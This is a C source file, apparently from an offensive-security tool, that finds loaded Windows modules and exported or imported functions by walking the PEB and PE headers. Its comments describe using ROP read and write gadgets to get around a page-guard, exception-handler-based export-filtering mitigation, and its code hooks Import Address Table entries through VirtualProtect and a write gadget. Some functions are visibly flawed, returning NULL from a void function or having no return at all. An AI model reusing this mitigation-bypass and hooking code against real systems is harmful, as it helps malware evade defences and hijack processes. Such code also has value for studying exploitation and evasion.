#include "defs.h"
#include "hunter.h"
#include "rop.h"

inline LPVOID get_base_address(){
    PPEB peb = NULL;
    #if defined(_WIN64)
        peb = (PPEB)__readgsqword(0x60);
    #else
        peb = (PPEB)__readfsdword(0x30);
    #endif
    return peb->ImageBaseAddress;
}

inline LPVOID help_GetModuleHandle(WCHAR* module_name){
    PPEB peb = NULL;
    #if defined(_WIN64)
        peb = (PPEB)__readgsqword(0x60);
    #else
        peb = (PPEB)__readfsdword(0x30);
    #endif
    PPEB_LDR_DATA ldr = peb->Ldr;
    LIST_ENTRY list = ldr->InLoadOrderModuleList;

    PLDR_DATA_TABLE_ENTRY Flink = *((PLDR_DATA_TABLE_ENTRY*)(&list));
    PLDR_DATA_TABLE_ENTRY curr_module = Flink;

    while (curr_module != NULL && curr_module->BaseAddress != NULL) {
        if (curr_module->BaseDllName.Buffer == NULL) continue;
        wchar_t* curr_name = curr_module->BaseDllName.Buffer;

        size_t i = 0;
        for (i = 0; module_name[i] != 0 && curr_name[i] != 0; i++) {

            wchar_t c1, c2;
            TO_LOWERCASE(c1, module_name[i]);
            TO_LOWERCASE(c2, curr_name[i]);
            if (c1 != c2) break;
        }
		
        if (module_name[i] == 0 && curr_name[i] == 0) {
            //found
            return curr_module->BaseAddress;
        }
        // not found, try next:
        curr_module = (PLDR_DATA_TABLE_ENTRY)curr_module->InLoadOrderModuleList.Flink;
    }
    return NULL;
}

inline void * help_GetProcAddress_Fail(LPVOID module, char* func_name, rop_gadget * gadget)
{
    IMAGE_DOS_HEADER* idh = (IMAGE_DOS_HEADER*)module;
    if (idh->e_magic != IMAGE_DOS_SIGNATURE) {
        return NULL;
    }
    IMAGE_NT_HEADERS* nt_headers = (IMAGE_NT_HEADERS*)((BYTE*)module + idh->e_lfanew);
    IMAGE_DATA_DIRECTORY* exportsDir = &(nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]);
    if (exportsDir->VirtualAddress == NULL) {
        return NULL;
    }

    DWORD expAddr = exportsDir->VirtualAddress;
    IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)(expAddr + (ULONG_PTR)module);
    SIZE_T namesCount = exp->NumberOfNames;

    // Accessing values by -> reference will translate to qword ptr [rax] or similar depends on the size
    // These instruction will trigger the page_guard and jump into the VEH handler by the mitigation
    // We can access them using the gadgets


    //getchar();
    DWORD funcsListRVA = exp->AddressOfFunctions;
    //DWORD funcNamesListRVA = exp->AddressOfNames;
    //DWORD namesOrdsListRVA = exp->AddressOfNameOrdinals;
    //DWORD funcsListRVA = read_primitive_int(gadget->Address,(char *)exp+offsetof(IMAGE_EXPORT_DIRECTORY,AddressOfFunctions), gadget->Offset, gadget->Negative);
    DWORD funcNamesListRVA = read_primitive_int(gadget->Address,(char *)exp+offsetof(IMAGE_EXPORT_DIRECTORY,AddressOfNames), gadget->Offset, gadget->Negative);
    DWORD namesOrdsListRVA = read_primitive_int(gadget->Address,(char *)exp+offsetof(IMAGE_EXPORT_DIRECTORY,AddressOfNameOrdinals), gadget->Offset, gadget->Negative);

    for (SIZE_T i = 0; i < namesCount; i++) {
        DWORD* nameRVA = (DWORD*)(funcNamesListRVA + (BYTE*)module + i * sizeof(DWORD));
        WORD* nameIndex = (WORD*)(namesOrdsListRVA + (BYTE*)module + i * sizeof(WORD));
        DWORD* funcRVA = (DWORD*)(funcsListRVA + (BYTE*)module + (*nameIndex) * sizeof(DWORD));

        LPSTR curr_name = (LPSTR)(*nameRVA + (BYTE*)module);
        size_t k = 0;

        // Here we need to remove any array accesses - [k] with our char gadgets

        //for (k = 0; func_name[k] != 0 && read_primitive_char(gadget->Address, (char* )curr_name + k, gadget->Offset, gadget->Negative) != 0; k++) {
        for (k = 0; func_name[k] != 0 && curr_name[k] != 0; k++) {
            if (func_name[k] != curr_name[k]) break;
        }
        if (func_name[k] == 0 && curr_name[k] == 0) {
            return (BYTE*)module + (*funcRVA);
        }
    }
    return NULL;
}

inline void * help_GetProcAddress(LPVOID module, char* func_name, rop_gadget * gadget)
{
    IMAGE_DOS_HEADER* idh = (IMAGE_DOS_HEADER*)module;
    if (idh->e_magic != IMAGE_DOS_SIGNATURE) {
        return NULL;
    }
    IMAGE_NT_HEADERS* nt_headers = (IMAGE_NT_HEADERS*)((BYTE*)module + idh->e_lfanew);
    IMAGE_DATA_DIRECTORY* exportsDir = &(nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]);
    if (exportsDir->VirtualAddress == NULL) {
        return NULL;
    }

    DWORD expAddr = exportsDir->VirtualAddress;
    IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)(expAddr + (ULONG_PTR)module);
    SIZE_T namesCount = exp->NumberOfNames;

    // Accessing values by -> reference will translate to qword ptr [rax] or similar depends on the size
    // These instruction will trigger the page_guard and jump into the VEH handler by the mitigation
    // We can access them using the gadgets


    //getchar();
    DWORD funcsListRVA = read_primitive_int(gadget->Address,(char *)exp+offsetof(IMAGE_EXPORT_DIRECTORY,AddressOfFunctions), gadget->Offset, gadget->Negative);
    DWORD funcNamesListRVA = exp->AddressOfNames;
    DWORD namesOrdsListRVA = exp->AddressOfNameOrdinals;
    //DWORD funcNamesListRVA = read_primitive_int(gadget->Address,(char *)exp+offsetof(IMAGE_EXPORT_DIRECTORY,AddressOfNames), gadget->Offset, gadget->Negative);
    //DWORD namesOrdsListRVA = read_primitive_int(gadget->Address,(char *)exp+offsetof(IMAGE_EXPORT_DIRECTORY,AddressOfNameOrdinals), gadget->Offset, gadget->Negative);

    for (SIZE_T i = 0; i < namesCount; i++) {
        DWORD* nameRVA = (DWORD*)(funcNamesListRVA + (BYTE*)module + i * sizeof(DWORD));
        WORD* nameIndex = (WORD*)(namesOrdsListRVA + (BYTE*)module + i * sizeof(WORD));
        DWORD* funcRVA = (DWORD*)(funcsListRVA + (BYTE*)module + (*nameIndex) * sizeof(DWORD));

        LPSTR curr_name = (LPSTR)(*nameRVA + (BYTE*)module);
        size_t k = 0;

        // Here we need to remove any array accesses - [k] with our char gadgets

        for (k = 0; func_name[k] != 0 && curr_name[k] != 0; k++) {
            if (func_name[k] != curr_name[k]) break;
        }
        if (func_name[k] == 0 && curr_name[k] == 0) {
            return (BYTE*)module + (*funcRVA);
        }
    }
    return NULL;
}

inline void * GetProcAddressIAT(LPVOID module, char* func_name, rop_gadget * gadget)
{

    IMAGE_DOS_HEADER* idh = (IMAGE_DOS_HEADER*)module;
    if (idh->e_magic != IMAGE_DOS_SIGNATURE) {
        return NULL;
    }
    IMAGE_NT_HEADERS* nt_headers = (IMAGE_NT_HEADERS*)((BYTE*)module + idh->e_lfanew);
    IMAGE_DATA_DIRECTORY* importsDir = &(nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]);
    if (importsDir->VirtualAddress == NULL) {
        return NULL;
    }

  DWORD impAddr = importsDir->VirtualAddress;
  IMAGE_IMPORT_DESCRIPTOR* import_table = (IMAGE_IMPORT_DESCRIPTOR*)(impAddr + (ULONG_PTR)module);

  IMAGE_IMPORT_BY_NAME * functionName = NULL;
  LPCSTR libraryName = NULL;

  while (import_table->Name != NULL){

    libraryName = (LPCSTR)import_table->Name + (DWORD_PTR)module;

    PIMAGE_THUNK_DATA originalFirstThunk = NULL, firstThunk = NULL;

    originalFirstThunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)module + import_table->OriginalFirstThunk);

    firstThunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)module + import_table->FirstThunk);

    while (originalFirstThunk->u1.AddressOfData != NULL){
      functionName = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)module + originalFirstThunk->u1.AddressOfData);
      // Handle corrupted pointers
      short int first_byte = ((unsigned char *)(&functionName))[7];
      if(first_byte == 0){

        if(help_strcmp(functionName->Name,func_name,gadget->Address,gadget->Offset,gadget->Negative) == 0){
          return firstThunk->u1.Function;
        }

      }
      ++originalFirstThunk;
      ++firstThunk;
    }
    import_table++;
  }

}

inline void * GetProcAddressIAT_Normal(LPVOID module, char* func_name, rop_gadget * gadget)
{

    IMAGE_DOS_HEADER* idh = (IMAGE_DOS_HEADER*)module;
    if (idh->e_magic != IMAGE_DOS_SIGNATURE) {
        return NULL;
    }
    IMAGE_NT_HEADERS* nt_headers = (IMAGE_NT_HEADERS*)((BYTE*)module + idh->e_lfanew);
    IMAGE_DATA_DIRECTORY* importsDir = &(nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]);
    if (importsDir->VirtualAddress == NULL) {
        return NULL;
    }

  DWORD impAddr = importsDir->VirtualAddress;
  IMAGE_IMPORT_DESCRIPTOR* import_table = (IMAGE_IMPORT_DESCRIPTOR*)(impAddr + (ULONG_PTR)module);

  IMAGE_IMPORT_BY_NAME * functionName = NULL;
  LPCSTR libraryName = NULL;

  while (import_table->Name != NULL){

    libraryName = (LPCSTR)import_table->Name + (DWORD_PTR)module;

    PIMAGE_THUNK_DATA originalFirstThunk = NULL, firstThunk = NULL;

    originalFirstThunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)module + import_table->OriginalFirstThunk);

    firstThunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)module + import_table->FirstThunk);

    while (originalFirstThunk->u1.AddressOfData != NULL){
      functionName = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)module + originalFirstThunk->u1.AddressOfData);
      // Handle corrupted pointers
      short int first_byte = ((unsigned char *)(&functionName))[7];
      if(first_byte == 0){

        if(help_strcmp_f(functionName->Name,func_name) == 0){
          return firstThunk->u1.Function;
        }

      }
      ++originalFirstThunk;
      ++firstThunk;
    }
    import_table++;
  }

}

inline void HookIATFunction(LPVOID module, char* func_name, rop_gadget * read_gadget, rop_gadget * write_gadget, char * new_func_pointer, ptrVirtualProtect _VirtualProtect)
{

    IMAGE_DOS_HEADER* idh = (IMAGE_DOS_HEADER*)module;
    if (idh->e_magic != IMAGE_DOS_SIGNATURE) {
        return NULL;
    }
    IMAGE_NT_HEADERS* nt_headers = (IMAGE_NT_HEADERS*)((BYTE*)module + idh->e_lfanew);
    IMAGE_DATA_DIRECTORY* importsDir = &(nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]);
    if (importsDir->VirtualAddress == NULL) {
        return NULL;
    }

  DWORD impAddr = importsDir->VirtualAddress;
  IMAGE_IMPORT_DESCRIPTOR* import_table = (IMAGE_IMPORT_DESCRIPTOR*)(impAddr + (ULONG_PTR)module);

  IMAGE_IMPORT_BY_NAME * functionName = NULL;
  LPCSTR libraryName = NULL;

  while (import_table->Name != NULL){

    libraryName = (LPCSTR)import_table->Name + (DWORD_PTR)module;

    PIMAGE_THUNK_DATA originalFirstThunk = NULL, firstThunk = NULL;

    originalFirstThunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)module + import_table->OriginalFirstThunk);

    firstThunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)module + import_table->FirstThunk);

    while (originalFirstThunk->u1.AddressOfData != NULL){
      functionName = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)module + originalFirstThunk->u1.AddressOfData);

      // Handle corrupted pointers
      short int first_byte = ((unsigned char *)(&functionName))[7];
      if(first_byte == 0){

        // Check the function name using gadget strcmp
        if(help_strcmp(functionName->Name,func_name,read_gadget->Address,read_gadget->Offset,read_gadget->Negative) == 0){

            int old;
            //printf("%p\n",firstThunk->u1.Function);
            // Change up protections to overwrite IAT
            _VirtualProtect(&firstThunk->u1.Function,8,PAGE_READWRITE,&old);

            // Here we finally overwrite the pointer itself
            // However the funny thing what I noticed
            // The write gadget is essentially useless
            // Because the pointer itself is not checked for accessing
            // Ofcourse I noticed this after doing all the gadgets 

            // This line will work just fine no need for gadgets
            //firstThunk->u1.Function = new_func_pointer;

            #ifdef DEBUG_D
                getchar();
            #endif

            write_primitive(write_gadget->Address,(char *)firstThunk + offsetof(IMAGE_THUNK_DATA,u1.Function),new_func_pointer);
            
            // Cleanup permissions - but not necessary
            _VirtualProtect(&firstThunk->u1.Function,8,old,&old);

            return NULL;
        }

      }
      ++originalFirstThunk;
      ++firstThunk;
    }
    import_table++;
  }

}